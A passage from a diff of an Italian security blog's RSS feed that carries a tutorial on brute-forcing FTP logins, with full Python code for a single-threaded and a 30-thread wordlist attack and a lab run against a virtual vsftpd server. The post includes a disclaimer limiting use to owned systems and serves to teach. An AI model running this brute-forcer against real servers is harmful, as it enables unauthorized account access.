+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
+    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
+    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
+    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
+q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Fantastico, è abbastanza simile al precedente, ma qui stiamo usando una coda che all&amp;rsquo;inizio è riempita con l&amp;rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password è corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo è cancellare la coda, ed è quello che stiamo facendo.&lt;/p&gt;
+&lt;p&gt;Abbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.&lt;/p&gt;
+&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
+init()
+&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
+host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
+user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(password):
+    &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
+    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
+    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
+        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
+        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials:&amp;#34;&lt;/span&gt;, password, Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
+passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# iterate over passwords one by one&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# if the password is found, break out of the loop&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(password):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ecco invece l’esempio piú complesso:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ftplib
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; threading &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Thread
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; queue
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Fore, init &lt;span style=&#34;color:#75715e&#34;&gt;# for fancy colors, nothing else&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# init the console for colors (for Windows)&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# init()&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# initialize the queue&lt;/span&gt;
+q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Queue()
+&lt;span style=&#34;color:#75715e&#34;&gt;# number of threads to spawn&lt;/span&gt;
+n_threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# hostname or IP address of the FTP server&lt;/span&gt;
+host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.1.113&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# username of the FTP server, root as default for linux&lt;/span&gt;
+user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# port of FTP, aka 21&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect_ftp&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; q
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# get the password from the queue&lt;/span&gt;
+        password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
+        &lt;span style=&#34;color:#75715e&#34;&gt;# initialize the FTP server object&lt;/span&gt;
+        server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying&amp;#34;&lt;/span&gt;, password)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# tries to connect to FTP server with a timeout of 5&lt;/span&gt;
+            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+            &lt;span style=&#34;color:#75715e&#34;&gt;# login using the credentials (user &amp;amp; password)&lt;/span&gt;
+            server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(user, password)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# login failed, wrong credentials&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# correct credentials&lt;/span&gt;
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;user&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            &lt;span style=&#34;color:#75715e&#34;&gt;# we found the password, let&amp;#39;s clear the queue&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mutex:
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;queue&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;clear()
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all_tasks_done&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;notify_all()
+                q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unfinished_tasks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
+            &lt;span style=&#34;color:#75715e&#34;&gt;# notify the queue that the task is completed for this password&lt;/span&gt;
+            q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;task_done()
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# read the wordlist of passwords&lt;/span&gt;
+passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wordlist.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Passwords to try:&amp;#34;&lt;/span&gt;, len(passwords))
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# put all passwords to the queue&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
+    q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;put(password)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# create `n_threads` that runs that function&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n_threads):
+    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;connect_ftp)
+    &lt;span style=&#34;color:#75715e&#34;&gt;# will end when the main thread end&lt;/span&gt;
+    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;daemon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+&lt;span style=&#34;color:#75715e&#34;&gt;# wait for the queue to be empty&lt;/span&gt;
+q&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;prova-sul-campo&#34;&gt;Prova sul Campo&lt;/h1&gt;
+&lt;p&gt;Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Disclaimer: ⚠️ Quello che verrà visto di seguito è un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione è un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra proprietà. ⚠️&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Andiamo a installare vsftpd e inseriamo un nuovo utente. L&amp;rsquo;utente appena creato avrà come credenziali:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;test : test&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Una volta creato &lt;code&gt;l&#39;utente&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; con la &lt;code&gt;password&lt;/code&gt; &lt;em&gt;test&lt;/em&gt; possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell&amp;rsquo;utente che ci interessa e l&amp;rsquo;indirizzo IP della macchina avviamo il codice python con:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 brute-ftp.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina &amp;ldquo;vittima&amp;rdquo; è una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l&amp;rsquo;utente test, questo è l&amp;rsquo;output:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Passwords to try: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying aheq
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying weeqe
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying 9wee
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying wewe
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying &lt;span style=&#34;color:#ae81ff&#34;&gt;9002&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Trying test
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Found credentials: 
+        Host: 192.168.1.242
+        User: test
+        Password: test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+    <item>
       <title>Introduzione All&#39;ARP Poisoning</title>
       <link>https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
